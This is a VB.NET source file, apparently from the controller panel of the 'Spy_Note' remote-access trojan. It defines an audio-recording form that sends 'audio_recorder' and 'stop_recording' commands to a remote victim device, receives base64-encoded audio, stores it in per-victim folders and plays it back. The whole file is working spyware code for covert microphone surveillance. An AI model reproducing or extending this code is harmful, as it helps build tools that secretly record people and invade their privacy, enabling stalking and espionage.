Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Record_Audio
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Private StrDateTime As String
    Private startTime As DateTime
    Private b91 As Integer
    Public Sub New()
        Me.StrDateTime = "00:00:00"
        Me.b91 = 0
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim flag3 As Boolean = Not Me.Panel3.Visible
                    If flag3 Then
                        Me.Panel3.Visible = True
                    End If
                    Me.Button1.Enabled = False
                    Me.Button2.Enabled = False
                Else
                    Dim flag4 As Boolean = Operators.CompareString(data, "[Im/Running]", False) = 0
                    If flag4 Then
                        Me.startTime = DateTime.MinValue
                        Me.StrDateTime = "00:00:00"
                        Me.Timer1.Enabled = True
                        Me.Button1.Enabled = False
                        Me.Button2.Enabled = True
                    Else
                        Dim flag5 As Boolean = Operators.CompareString(data, "-2", False) = 0
                        If flag5 Then
                            Me.Button1.Enabled = False
                            Me.Button2.Enabled = False
                        Else
                            Dim text As String = String.Concat(New String() {Application.StartupPath, "\", store_0.name_folder_app_resource, "\Folder_Clients\", Me.Name_Client, Me.Client_ID, "\Audio_Manager"})
                            Dim flag6 As Boolean = Not My.Computer.FileSystem.DirectoryExists(text)
                            If flag6 Then
                                My.Computer.FileSystem.CreateDirectory(text)
                            End If
                            Dim arg As String = DateTime.Now.ToString("yyyy-MM-dd-HH.mm.ss")
                            Dim str As String = String.Format("{0:1}", arg, Nothing)
                            Dim stringBuilder As StringBuilder = New StringBuilder()
                            stringBuilder.AppendFormat("{0}", data)
                            File.WriteAllBytes(text + "\" + str + ".wav", Convert.FromBase64String(stringBuilder.ToString()))
                            Me.AxWindowsMediaPlayer1.URL = text + "\" + str + ".wav"
                            Me.AxWindowsMediaPlayer1.Ctlcontrols.play()
                            Me.Timer1.Enabled = False
                            Me.Button1.Enabled = True
                            Me.Button2.Enabled = False
                            Me.Button2.Text = "Stop recording(" + Me.StrDateTime + ")"
                        End If
                    End If
                    Dim visible As Boolean = Me.Panel3.Visible
                    If visible Then
                        Me.Panel3.Visible = False
                    End If
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Record_Audio_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Audio Record - Remote Address & Port: {0} Client Name: {1}", Me.Client_remote_Address, Me.Name_Client)
        Me.Text = text
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "stop_recording")
        Me.Button2.Enabled = False
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Button1.Enabled = False
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "audio_recorder")
    End Sub

    Public Function e90() As String
        Dim flag As Boolean = Me.b91 > 2
        If flag Then
            Me.b91 = 0
        End If
        Dim result As String
        Select Case Me.b91
            Case 0
                result = "."
            Case 1
                result = ".."
            Case 2
                result = "..."
            Case Else
                result = "..."
        End Select
        Return result
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.startTime = Me.startTime.AddSeconds(1.0)
        Me.StrDateTime = Me.startTime.ToString("HH:mm:ss")
        Dim flag As Boolean = Not Me.Button2.Enabled
        If flag Then
            Me.Button2.Text = "Stop recording(" + Me.StrDateTime + ") Please Wait" + Me.e90()
            Me.b91 += 1
        Else
            Me.b91 = 0
            Me.Button2.Text = "Stop recording(" + Me.StrDateTime + ")"
        End If
    End Sub
End Class